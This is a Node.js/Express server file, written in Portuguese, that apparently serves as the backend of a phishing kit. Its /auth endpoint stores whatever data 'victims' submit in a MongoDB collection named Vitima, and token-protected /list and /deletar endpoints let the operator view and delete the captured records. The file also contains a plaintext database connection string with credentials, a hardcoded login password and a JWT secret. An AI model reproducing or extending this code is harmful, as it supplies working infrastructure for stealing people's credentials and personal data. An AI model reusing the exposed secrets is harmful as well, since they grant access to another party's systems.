const express = require("express");
const app = express();
const fs = require("fs");
const cors = require("cors");
const mongoose = require("mongoose");
const VitimaModel = require("./models/Vitima");
const jwt = require("jsonwebtoken");

mongoose.connect(
  "mongodb+srv://brokeh:Brokao0107@cluster0.p8qmd.gcp.mongodb.net/bb?retryWrites=true&w=majority",
  {
    useUnifiedTopology: true,
    useNewUrlParser: true,
  }
);

app.use(express.json());
app.use(cors());

app.get("/deletar", async (req, res) => {
  let { id } = req.query;

  const { token } = req.headers;
  if (!token) return res.send("fail");

  if (!jwt.verify(token, "BROKAO666")) {
    return res.send("fail");
  }

  let deleted = await VitimaModel.deleteOne({ _id: id });

  if (deleted) {
    let list = await VitimaModel.find({});
    return res.send(list);
  } else {
    return res.send("fail");
  }
});

app.post("/login", async (req, res) => {
  const { senha } = req.body;

  if (senha === "01070107!") {
    let token = jwt.sign({ senha }, "BROKAO666", { expiresIn: "1d" });
    console.log(token);

    res.send(token);
  } else {
    res.send("fail");
  }
});

app.post("/auth", async (req, res) => {
  /// vitima inseriu os dados
  const body = req.body;
  console.log(body);
  let vitima = await new VitimaModel(body);

  if (vitima.save()) {
    res.send("ok");
  } else {
    res.send("fail");
  }
});

app.get("/list", async (req, res) => {
  const { token } = req.headers;
  if (!token) return res.send("fail");

  if (!jwt.verify(token, "BROKAO666")) {
    return res.send("fail");
  }

  let lista = await VitimaModel.find({});

  return res.send(lista);
});

app.listen(process.env.PORT || 3030);
